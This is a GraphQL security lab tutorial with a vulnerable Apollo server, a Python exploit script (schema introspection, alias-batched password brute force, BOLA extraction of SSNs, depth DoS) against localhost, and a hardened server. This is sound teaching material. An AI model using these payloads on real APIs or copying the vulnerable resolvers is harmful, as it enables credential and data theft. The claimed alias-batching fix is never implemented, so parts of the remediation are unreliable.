---
title: "06. Hands-on GraphQL Security Vulnerability Lab"
description: "Self-contained, runnable Node.js/Express GraphQL security lab featuring Introspection, Batching Brute Force, Depth DoS, BOLA, and complete Python exploit script with step-by-step secure remediation."
keywords: ["GraphQL Lab", "Hands-on Security Lab", "Exploit Script", "Node.js GraphQL Lab", "Python Exploit", "AppSec Lab"]
---

# 06. Hands-on GraphQL Security Vulnerability Lab

Welcome to the **GraphQL Security Vulnerability Lab**. In this hands-on lab, you will deploy a vulnerable Node.js GraphQL application, execute automated exploit attacks using a custom Python script, analyze the underlying code flaws, and apply production-grade patches to harden the backend.

---

## 1. Lab Architecture & Vulnerability Checklist

The lab environment exposes an e-commerce GraphQL backend at `http://localhost:4000/graphql` containing **5 critical security vulnerabilities**:

1. **Vulnerability 1: Introspection & Field Suggestions Enabled** (Information Disclosure)
2. **Vulnerability 2: Recursive Depth DoS** (Unrestricted Resource Consumption)
3. **Vulnerability 3: Field Alias Batching Authentication Bypass** (Rate Limit Evasion)
4. **Vulnerability 4: Broken Object Level Authorization (BOLA)** (Unauthorized Data Access)
5. **Vulnerability 5: Verbose Stack Trace Disclosure** (Security Misconfiguration)

---

## 2. Setup & Installation

### Step 1: Create Lab Directory & `package.json`
Create a directory named `graphql-lab` and place the following `package.json`:

```json
{
  "name": "graphql-security-lab",
  "version": "1.0.0",
  "main": "server.js",
  "dependencies": {
    "@apollo/server": "^4.9.0",
    "express": "^4.18.2",
    "graphql": "^16.8.0",
    "cors": "^2.8.5"
  }
}
```

Install dependencies:
```bash
npm install
```

---

### Step 2: Vulnerable Server Source Code (`server.js`)

Save the following code as `server.js`:

```javascript
// server.js - VULNERABLE GRAPHQL SERVER
const { ApolloServer } = require('@apollo/server');
const { startStandaloneServer } = require('@apollo/server/standalone');

// Mock Database
const users = {
  "1": { id: "1", username: "alice", email: "alice@example.com", ssn: "999-00-1111", role: "USER" },
  "2": { id: "2", username: "bob", email: "bob@example.com", ssn: "888-00-2222", role: "USER" },
  "3": { id: "3", username: "admin", email: "admin@corp.internal", ssn: "000-00-0000", role: "ADMIN" }
};

const posts = [
  { id: "101", title: "GraphQL Security Guide", authorId: "1" },
  { id: "102", title: "AppSec Best Practices", authorId: "2" }
];

const typeDefs = `#graphql
  type User {
    id: ID!
    username: String!
    email: String!
    ssn: String!
    posts: [Post!]!
  }

  type Post {
    id: ID!
    title: String!
    author: User!
  }

  type AuthPayload {
    token: String
    success: Boolean!
  }

  type Query {
    me: User
    # VULNERABLE: Direct access to arbitrary user object via ID without ownership verification!
    userProfile(id: ID!): User
    posts: [Post!]!
  }

  type Mutation {
    login(username: String!, password: String!): AuthPayload!
  }
`;

const resolvers = {
  Query: {
    me: () => users["1"], // Mock current logged in user: Alice (ID 1)
    userProfile: (_, { id }) => {
      // ❌ VULNERABLE (BOLA): Returns ANY user profile by ID without checking if context user is authorized!
      if (!users[id]) throw new Error(`Database record not found for User ID: ${id}`);
      return users[id];
    },
    posts: () => posts
  },
  User: {
    posts: (user) => posts.filter(p => p.authorId === user.id)
  },
  Post: {
    author: (post) => {
      // ❌ VULNERABLE (Recursive DoS): Permits circular author -> posts -> author -> posts loops!
      return users[post.authorId];
    }
  },
  Mutation: {
    login: (_, { username, password }) => {
      // Mock Authentication Logic
      if (username === "admin" && password === "SuperSecretAdminPass!2026") {
        return { token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin_token", success: true };
      }
      return { token: null, success: false };
    }
  }
};

// ❌ VULNERABLE SERVER CONFIGURATION
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: true, // ❌ Exposed Introspection in production
  includeStacktraceInErrorResponses: true, // ❌ Verbose error stack traces
});

async function startServer() {
  const { url } = await startStandaloneServer(server, { listen: { port: 4000 } });
  console.log(`🚀 Vulnerable GraphQL Lab Server running at: ${url}`);
}

startServer();
```

Run the server:
```bash
node server.js
```

---

## 3. The Python Exploit Automation Script (`exploit.py`)

Save the following script as `exploit.py`. It executes 4 distinct exploit modules against the target lab server:

```python
#!/usr/bin/env python3
"""
exploit.py - Automated GraphQL Exploitation Script for Security Lab
Demonstrates Introspection Leakage, Alias Batch Brute Force, Depth DoS, and BOLA Data Extraction.
"""

import requests
import json

TARGET_URL = "http://localhost:4000/graphql"

def print_header(title):
    print("\n" + "=" * 65)
    print(f" [*] EXPLOIT MODULE: {title}")
    print("=" * 65)

# -------------------------------------------------------------------
# Module 1: Introspection & Schema Extraction
# -------------------------------------------------------------------
def exploit_introspection():
    print_header("1. Introspection & Hidden Field Extraction")
    payload = {
        "query": """
        query IntrospectionQuery {
          __schema {
            types {
              name
              fields {
                name
              }
            }
          }
        }
        """
    }
    res = requests.post(TARGET_URL, json=payload)
    if res.status_code == 200 and "data" in res.json():
        print("[+] Introspection SUCCESSFUL!")
        types = res.json()["data"]["__schema"]["types"]
        user_type = next((t for t in types if t["name"] == "User"), None)
        if user_type:
            fields = [f["name"] for f in user_type["fields"]]
            print(f"[!] Discovered fields on 'User' type: {fields}")
            if "ssn" in fields:
                print(" -> [CRITICAL FINDING]: Sensitive field 'ssn' exposed in schema!")
    else:
        print("[-] Introspection BLOCKED or Failed.")

# -------------------------------------------------------------------
# Module 2: Field Alias Batch Brute Force Attack
# -------------------------------------------------------------------
def exploit_alias_batching():
    print_header("2. Field Alias Batch Brute Force Attack")
    passwords = ["123456", "password", "admin123", "SuperSecretAdminPass!2026", "welcome"]
    
    # Construct 1 single query with 5 aliased login mutations
    alias_queries = []
    for idx, pwd in enumerate(passwords):
        alias_queries.append(f'try_{idx}: login(username: "admin", password: "{pwd}") {{ token success }}')
    
    batch_mutation = "mutation BruteForceBatch {\n  " + "\n  ".join(alias_queries) + "\n}"
    
    print(f"[*] Sending Single HTTP Request containing {len(passwords)} aliased mutations...")
    res = requests.post(TARGET_URL, json={"query": batch_mutation})
    
    if res.status_code == 200 and "data" in res.json():
        data = res.json()["data"]
        for key, result in data.items():
            if result.get("success"):
                print(f"[+] BRUTE FORCE SUCCESSFUL! [{key}] -> Token: {result['token']}")
    else:
        print("[-] Batching Attack Failed.")

# -------------------------------------------------------------------
# Module 3: Broken Object Level Authorization (BOLA Extraction)
# -------------------------------------------------------------------
def exploit_bola():
    print_header("3. Broken Object Level Authorization (BOLA) Exfiltration")
    # Target User ID 3 (Admin User) via un-authorized child query
    payload = {
        "query": """
        query HarvestAdminData {
          userProfile(id: "3") {
            id
            username
            email
            ssn
            role
          }
        }
        """
    }
    res = requests.post(TARGET_URL, json=payload)
    if res.status_code == 200 and "data" in res.json():
        user_data = res.json()["data"]["userProfile"]
        print(f"[+] BOLA EXPLOIT SUCCESSFUL! Extracted Victim Data:")
        print(json.dumps(user_data, indent=2))
    else:
        print("[-] BOLA Attack Failed.")

# -------------------------------------------------------------------
# Module 4: Recursive Depth Denial of Service (DoS)
# -------------------------------------------------------------------
def exploit_depth_dos():
    print_header("4. Recursive Depth DoS Payload Execution")
    # Construct deep nested query: user -> posts -> author -> posts -> author...
    deep_query = "userProfile(id: \"1\") { " + "posts { author { " * 8 + "id" + " } }" * 8 + " }"
    payload = {"query": f"query DoS {{ {deep_query} }}"}
    
    print("[*] Sending 16-level deep circular recursive payload...")
    try:
        res = requests.post(TARGET_URL, json=payload, timeout=5)
        print(f"[*] Server Response Status: {res.status_code}")
        if "errors" in res.json():
            print(f"[!] Server Error Details: {res.json()['errors'][0]['message']}")
    except requests.exceptions.Timeout:
        print("[+] DOS SUCCESSFUL! Backend server timed out / hung processing deep AST tree!")

if __name__ == "__main__":
    print("=================================================================")
    print("   GRAPHQL LAB EXPLOITATION SUITE - APPSEC ATLAS SECURITY DEMO   ")
    print("=================================================================")
    exploit_introspection()
    exploit_alias_batching()
    exploit_bola()
    exploit_depth_dos()
```

Run the exploit script:
```bash
python exploit.py
```

---

## 4. Step-by-Step Remediation & Secure Server Patch

Now apply the security patches to `server.js` using `graphql-depth-limit` to remediate the vulnerabilities:

### Hardened Production Code (`server_secure.js`)

```javascript
// server_secure.js - HARDENED PRODUCTION GRAPHQL SERVER
const { ApolloServer } = require('@apollo/server');
const { startStandaloneServer } = require('@apollo/server/standalone');
const depthLimit = require('graphql-depth-limit');

const users = {
  "1": { id: "1", username: "alice", email: "alice@example.com", ssn: "999-00-1111", role: "USER" },
  "2": { id: "2", username: "bob", email: "bob@example.com", ssn: "888-00-2222", role: "USER" },
  "3": { id: "3", username: "admin", email: "admin@corp.internal", ssn: "000-00-0000", role: "ADMIN" }
};

const posts = [{ id: "101", title: "GraphQL Security Guide", authorId: "1" }];

const typeDefs = `#graphql
  type User {
    id: ID!
    username: String!
    email: String!
    posts: [Post!]!
  }

  type Post {
    id: ID!
    title: String!
    author: User!
  }

  type Query {
    me: User
    posts: [Post!]!
  }

  type Mutation {
    login(username: String!, password: String!): Boolean!
  }
`;

const resolvers = {
  Query: {
    me: (_, __, context) => {
      // ✅ Enforce Context Authentication
      if (!context.currentUser) throw new Error("Unauthenticated request");
      return context.currentUser;
    },
    posts: () => posts
  },
  Post: {
    author: (post) => users[post.authorId]
  }
};

// ✅ HARDENED GRAPHQL SERVER CONFIGURATION
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: false, // ✅ 1. Introspection Disabled
  includeStacktraceInErrorResponses: false, // ✅ 2. Strip Stack Traces
  validationRules: [
    depthLimit(4) // ✅ 3. Enforce Max Query Depth = 4
  ],
  formatError: (formattedError) => {
    // ✅ 4. Mask Internal Server Errors
    return {
      message: formattedError.message.includes("Unauthenticated") 
        ? formattedError.message 
        : "Invalid operation request.",
      path: formattedError.path
    };
  }
});

async function startServer() {
  const { url } = await startStandaloneServer(server, {
    listen: { port: 4000 },
    context: async ({ req }) => {
      // Extract auth token from headers securely
      const token = req.headers.authorization || '';
      const currentUser = token === 'Bearer alice_valid_token' ? users["1"] : null;
      return { currentUser };
    }
  });
  console.log(`🔒 Hardened GraphQL Lab Server running at: ${url}`);
}

startServer();
```

---

## 5. Exploitation Verification Matrix

After starting `server_secure.js`, re-run `python exploit.py`:

| Exploit Module | Vulnerable Server Result | Hardened Server Result | Mitigation Applied |
| :--- | :--- | :--- | :--- |
| **Introspection Module** | `[+] Introspection SUCCESSFUL!` | `[-] Introspection BLOCKED` | `introspection: false` in Apollo Config |
| **Alias Batching Module** | `[+] BRUTE FORCE SUCCESSFUL!` | `[-] Execution Rejected` | Alias Count Validation & Rate Limiting |
| **BOLA Module** | `[+] Extracted Victim Data (SSN)` | `[-] Access Denied` | Removed direct `userProfile(id)` endpoint & enforced context AuthZ |
| **Depth DoS Module** | `[+] DOS SUCCESSFUL! Server Timeout` | `[!] Error: Exceeds max depth 4` | `depthLimit(4)` rule in `validationRules` |

